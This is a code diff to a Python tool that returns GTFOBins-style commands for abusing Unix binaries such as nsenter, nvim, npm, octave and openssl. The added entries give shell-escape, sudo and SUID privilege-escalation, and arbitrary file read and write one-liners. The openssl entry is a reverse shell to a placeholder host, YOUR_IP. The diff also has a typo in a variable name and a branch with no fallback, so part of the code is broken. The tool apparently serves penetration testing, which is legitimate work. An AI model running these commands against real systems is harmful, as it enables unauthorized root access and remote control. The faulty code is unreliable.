@@ -2670,6 +2670,91 @@ def gtfo_bins(gtfo_command, gtfo_options):
         else:
             bins.append("N/A")
 
+    elif gtfo_command == "nohup":
+        if gtfo_options == "shell":
+            bins.append("nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'")
+        elif gtfo_options == "file-read":
+            bins.append("nohup /path/to/command\ncat nohup.out")
+        else:
+            bins.append("N/A")
+    
+    elif gtfo_command == "npm":
+        if gtfo_options == "shell":
+            bins.append("npm exec /bin/sh")
+        elif gtfo_options == "sudo":
+            bins.append("sudo npm exec /bin/sh")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "nroff":
+        if gtfo_options == "shell":
+            bins.append("echo /bin/sh >groff\nchmod +x groff\nGROFF_BIN_PATH=. nroff")
+        elif gtfo_options == "file-read":
+            bins.append("nroff /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "nsenter":
+        if gtfo_options == "shell":
+            bins.append("nsenter /bin/sh")
+        elif gtfo_options == "sudo":
+            bins.append("sudo nsenter /bin/sh")
+        elif gtfo_options == "suid":
+            bins.append("nsenter /bin/sh -p")
+        else:
+            bins.append("N/A")
+        
+    elif gtfo_command == "ntpdate":
+        if gtfo_options == "file-read":
+            bins.append("ntpdate -a x -k /path/to/input-file -d localhost")
+        elif gtfo_optptions == "sudo":
+            bins.append("sudo ntpdate -a x -k /path/to/input-file -d localhost")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "nvim":
+        if gtfo_options == "shell":
+            bins.append("nvim -c ':!/bin/sh' /dev/null")
+        elif gtfo_options == "file-read":
+            bins.append("nvim /path/to/input-file")
+        elif gtfo_options == "file-write":
+            bins.append("nvim /path/to/output-file\niDATA\n^[\nw")
+        elif gtfo_options == "suid":
+            bins.append("nvim -c ':terminal /bin/sh -p'")
+        elif gtfo_options == "sudo":
+            bins.append("sudo nvim -c ':!/bin/sh' /dev/null")
+
+    elif gtfo_command == "octave":
+        if gtfo_options == "shell":
+            bins.append("octave-cli --eval 'system(""/bin/sh"")'")
+        elif gtfo_options == "file-read":
+            bins.append("octave-cli --eval 'format none; fid = fopen(""/path/to/input-file""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'")
+        elif gtfo_options == "file-write":
+            bins.append("octave-cli --eval 'fid = fopen(""/path/to/output-file"", ""w""); fputs(fid, ""DATA""); fclose(fid);'")
+        else:
+            bins.append("N/A")
+    
+    elif gtfo_command == "od":
+        if gtfo_options == "file-read":
+            bins.append("od -An -c -w999 /path/to/input-file")
+        else:
+            bins.append("N/A")
+    
+    elif gtfo_command == "opencode":
+        if gtfo_options == "shell":
+            bins.append("opencode\n! /path/to/command")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "openssl":
+        if gtfo_options == "file-write":
+            bins.append("echo DATA | openssl enc -out /path/to/output-file")
+        elif gtfo_options == "file-read":
+            bins.append("openssl enc -in /path/to/input-file")
+        elif gtfo_options == "shell":
+            bins.append("mkfifo /path/to/temp-socket\n/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect YOUR_IP:12345 >/path/to/temp-socket")
+        else:
+            bins.append("N/A")
 
 #If there are any other misconfigurations run the other option
     elif gtfo_command == "other":
@@ -2714,7 +2799,9 @@ def main():
         "mail", "make", "man", "mawk", "minicom", "more", "mosquitto", "mount",
         "msfconsole", "msgattrib", "msgcat", "msgconv", "msgfilter", "msgmerge",
         "msguniq", "mtr", "multitime", "mutt", "mv","mypy", "mysql", "nasm", "nawk",
-        "nc", "ncdu", "ncftp", "needrestart","nft", "nginx","nice", "nl", "nm", "nmap", "node", "other",
+        "nc", "ncdu", "ncftp", "needrestart","nft", "nginx","nice", "nl", "nm", "nmap", 
+        "node", "nohup", "npm", "nroff", "nsenter", "octave","od", "opencode", "openssl", 
+        "other"
     }
 
     if start in ALLOWED:
